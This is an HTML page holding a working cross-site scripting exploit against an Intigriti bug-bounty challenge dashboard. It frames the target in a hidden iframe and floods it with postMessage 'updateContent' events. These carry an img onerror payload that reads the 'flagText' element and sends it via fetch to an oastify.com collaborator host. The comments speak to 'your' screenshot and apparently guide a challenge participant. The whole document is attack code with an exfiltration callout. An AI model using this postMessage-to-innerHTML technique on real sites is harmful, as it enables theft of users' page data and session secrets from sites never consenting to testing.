<!DOCTYPE html>
<html>
<body>
    <script>
        const COLLAB = 'https://1tv9xc03lrjypjn8su4geqi3quwlkb80.oastify.com';
        const TARGET = 'https://challenge-0126.intigriti.io/dashboard.html';
        
        // This payload targets the innerHTML sink on line 35 of the dashboard image
        // It steals the flag banner text and sends it to your collaborator
        const XSS = `<img src=x onerror="fetch('${COLLAB}/?flag='+btoa(document.getElementById('flagText').innerText))">`;

        // Step 1: Open the target in a hidden frame
        const iframe = document.createElement('iframe');
        iframe.src = TARGET;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            // Step 2: Trigger the 'updateContent' event found in your dashboard screenshot
            // This bypasses the need for the checkout page entirely!
            const message = {
                type: 'updateContent',
                widgetId: 'customReports', // This ID is visible in your screenshot line 23
                content: XSS
            };

            // Step 3: Spam the message to the local frame
            setInterval(() => {
                iframe.contentWindow.postMessage(message, '*');
            }, 100);
        };
    </script>
</body>
</html>
